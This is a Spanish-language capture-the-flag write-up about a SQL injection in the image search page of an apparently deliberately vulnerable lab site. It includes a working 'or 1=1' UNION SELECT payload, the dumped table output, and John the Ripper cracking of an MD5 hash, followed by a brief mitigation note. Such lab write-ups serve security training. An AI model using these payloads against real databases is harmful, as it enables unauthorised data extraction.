# SQL Injection - Images
### A03:2021-Injection

Misma vulnerabilidad que [la inyección SQL en la vista de usuarios](./sql_injection_users.md). 


## Ataque

- **Localización**: /index.php?page=searchimg

En el apartado de búsqueda de imágenes tenemos un buscador de imágenes por id, en este caso la inyección está un poco más obfuscada ya que no imprime por pantalla el error de la query.

De todas formas, si enviamos como input `1 or 1=1`, recibimos todas las imágenes guardadas en la base de datos.

Inyectamos la siguiente query:
```
1 or 1=1 union select title, comment from list_images
```

Nos devuelve esto:
```
ID:  1 or 1=1 union select title, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

Crackeamos el hash MD5 con **johntheripper**.

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
albatroz         (?)     
1g 0:00:00:00 DONE (2025-06-23 17:14) 10.00g/s 10333Kp/s 10333Kc/s 10333KC/s aldamae..alamito22
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

echo -n albatroz | sha256sum
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -
```
## Mitigaciones

- Validaciones en backend, sobre todo con respecto a uso de ORMs para parametrizar el input en queries.

## Referencias

- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)